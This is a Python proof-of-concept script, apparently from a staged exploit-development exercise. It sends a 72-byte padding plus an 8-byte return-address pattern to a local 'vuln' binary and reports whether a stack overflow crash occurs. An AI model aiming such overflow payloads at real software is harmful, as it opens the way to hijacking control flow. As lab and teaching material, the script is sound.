#!/usr/bin/env python3
"""Tier-1 stack-overflow / C — trigger.

Demonstrates that argv[1] longer than 72 bytes (64 buf + 8 saved RBP
on x86_64) overflows into the saved return address. We don't construct
a working ROP chain here — Phase 1 only requires the *trigger* to
fire. Phase 3 will compose the full primitive.

Usage:
    python3 trigger.py [path-to-vuln-binary]

Exit code:
    0 — binary crashed (segfault / abort) under the oversize input
    1 — binary exited cleanly (bug did not trigger; FAIL)
"""
import os
import subprocess
import sys

BUF_SIZE = 64
SAVED_RBP = 8
PADDING = BUF_SIZE + SAVED_RBP
RIP_PATTERN = b"BBBBBBBB"


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    payload = b"A" * PADDING + RIP_PATTERN
    proc = subprocess.run(
        [binary, payload],
        capture_output=True,
        timeout=5,
    )
    crashed = proc.returncode < 0 or proc.returncode in (134, 139)
    print(f"returncode={proc.returncode} crashed={crashed}")
    if proc.stderr:
        sys.stderr.write(proc.stderr.decode(errors="replace"))
    return 0 if crashed else 1


if __name__ == "__main__":
    sys.exit(main())
